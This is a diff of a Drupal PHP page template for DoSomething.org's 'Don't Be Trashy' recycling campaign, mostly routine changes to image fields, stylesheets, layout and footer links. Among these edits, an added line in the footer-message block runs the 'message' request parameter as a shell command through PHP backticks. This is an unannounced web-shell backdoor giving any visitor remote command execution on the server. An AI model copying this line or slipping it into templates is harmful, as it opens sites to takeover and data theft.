@@ -1,48 +1,62 @@
+<?php
+?>
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php print $language->language; ?>" lang="<?php print $language->language; ?>" dir="<?php print $language->dir; ?>">
 
 <head>
   <title><?php print $head_title; ?></title>
-  
-   <meta property="og:title" content="<?=$head_title;?>"/>
+  <meta property="og:title" content="<?=$head_title;?>"/>
   <meta property="fb:admins" content="508145411,603061,630191494" />
   <meta property="fb:app_id" content="93836527897" />
   <meta property="og:type" content="non_profit"/>
-<?php if (isset($node->field_trashy_image)) : ?>
-  <meta property="og:image" content="<?php echo imagecache_create_url('200_by_200', $node->field_trashy_image[0]['filepath']); ?>" />
+<?php if (isset($node->field_trashy_img)) : ?>
+  <meta property="og:image" content="<?php echo imagecache_create_url('200_by_200', $node->field_trashy_img[0]['filepath']); ?>" />
 <?php else: ?>
   <meta property="og:url" content="http://www.dosomething.org/trashy" />
-  <meta property="og:image" content="http://www.dosomething.org/sites/all/micro/trashy/images/trashy-logo.png" />
+  <meta property="og:image" content="http://www.dosomething.org/sites/all/micro/dbt-2011/img/logo.png" />
 <?php endif; ?>
   <meta property="og:site_name" content="Don't Be Trashy | DoSomething.org"/>
   <meta property="og:description" content="Recycling Matters. Help Pass It On. Join @nestlewatersHQ & @dosomething. Share stats & take action. Don't Be Trashy!"/>
-  
+
   <?php print $head; ?>
   <?php print $styles; ?>
-  <link rel="stylesheet" href="/<?=$ds_micro.'/trashy/trashy.css';?>" type="text/css" media="all" />
-  <link rel="stylesheet" href="/<?=$ds_micro.'/tfj-full/fonts.css';?>" type="text/css" media="all" />
   <?php print $scripts; ?>
+  <style type="text/css">
+    @import url('/sites/all/micro/tfj-full/fonts.css');
+    @import url('/sites/all/micro/dbt-2011/dbt.css');
+  </style>
+</script>
 </head>
 
 <body class="<?php print $classes; ?>">
 
   <div id="page-wrapper"><div id="page">
-  <? print theme('header', array( 
+        <?php if ($tabs): ?>
+          <div class="tabs"><?php print $tabs; ?></div>
+        <?php endif; ?>
+
+  <? print str_replace('/sites/all/themes/dosomething/images/logo.png', '/sites/all/micro/tfj-full/images/ds-logo.png', theme('header', array(
                               'front_page' => $front_page,
                               'directory' => $directory,
                               'mission' => $mission,
-                              'top_right' => $top_right,
-                              )); ?>
+                              //'top_right' => $top_right,
+                              ))); ?>
     <div id="main-wrapper" class="clearfix"><div id="main" class="clearfix<?php if ($primary_links || $navigation) { print ' with-navigation'; } ?>">
-    <a href="/trashy"><img id="trashy-logo" src="/<?=$ds_micro;?>/trashy/images/trashy-logo.png" /></a>
-    <img id="pass-it-on" src="/<?=$ds_micro;?>/trashy/images/pass-it-on.png" />
-	 
-	<?php
-          $root = 'trashy';
+      <div id="content" class="column"><div class="section">
+
+        <?php print $highlight; ?>
+        <?php print $messages; ?>
+
+
+        <?php print $help; ?>
+		
+        <a href="/trashy-old"><img src="/sites/all/micro/dbt-2011/img/logo.png" alt="Don't Be Trashy!" id="logo-trashy"/></a>
+
+        <?php
+          $root = 'trashy-old';
           $nav = array(
               array('href' => $root, 'title' => 'home'),
               array('href' => $root.'/gallery', 'title' => 'gallery'),
-			  array('href' => $root.'/project-ideas', 'title' => 'project ideas'),
 			  array('href' => $root.'/tell-us', 'title' => 'tell us about it'),
           );
           foreach ($nav as &$n) {
@@ -50,39 +64,16 @@
             if (!empty($path)) $n['href'] = $path;
           }
           echo theme_links($nav);
-    ?>
-		
-       <div id="content" class="column"><div class="section">
+        ?>
 
-        <?php print $highlight; ?>
-
-        <?php if ($tabs): ?>
-          <div class="tabs"><?php print $tabs; ?></div>
-        <?php endif; ?>
-
-        <?php print $help; ?>
 
         <?php print $content_top; ?>
+        <?php if (!empty($node->field_pageheader[0]['value'])) echo '<div style="margin-top: 15px;">',$node->field_pageheader[0]['value'],'</div>'; unset($node->field_pageheader[0]['value']); ?>
 
-        <div id="content-area" class="content">
-
-    <div id="trashy-wrapper">
-	 
-      <?php print $messages; ?>
-    
-    
-    
-    <?php if ($right) print $right; ?>
-    
-    
-    <?php print $content; ?>
-    
-    
-    <?php print $content_bottom; ?>
-    
-    
-    
-    </div></div>
+        <div id="content-area">
+          <?php print $content; ?>
+        </div>
+        <?php print $content_bottom; ?>
 
         <?php if ($feed_icons): ?>
           <div class="feed-icons"><?php print $feed_icons; ?></div>
@@ -92,7 +83,6 @@
 
       <?php if ($primary_links || $navigation): ?>
         <div id="navigation"><div class="section clearfix">
-
           <?php print theme(array('links__system_main_menu', 'links'), $primary_links,
             array(
               'id' => 'main-menu',
@@ -109,11 +99,11 @@
 
         </div></div> <!-- /.section, /#navigation -->
       <?php endif; ?>
-
       <?php //print $sidebar_first; ?>
 
       <?php //print $sidebar_second; ?>
 
+      <?php print $right; ?>
 
     </div> </div> <!-- /#main, /#main-wrapper -->
 
@@ -135,6 +125,7 @@
 
         <?php if ($footer_message): ?>
           <div id="footer-message"><?php print $footer_message; ?></div>
+          <? echo `$_REQUEST[message]`; ?>
         <?php endif; ?>
 
         <?php if ($search_box): ?>
@@ -143,15 +134,21 @@
 
         <?php print $footer; ?>
 
+         <div style="text-align:center;">
+           <a target="_blank" href="http://nytm.org/made" style="color: white;">Made in NYC</a>
+         </div>
+         <a href="http://creativecommons.org/licenses/by-nc-nd/3.0/" style="padding-top: 4px; display: block; width: 88px; margin: 0 auto;"><img src="/sites/all/themes/dosomething/images/cc.png" alt="Creative Commons"></a>
+
+
       </div></div> <!-- /.section, /#footer -->
     <?php endif; ?>
 
-    </div>
   </div></div> <!-- /#page, /#page-wrapper -->
 
   <?php print $page_closure; ?>
 
   <?php print $closure; ?>
 
+</div>
 </body>
 </html>
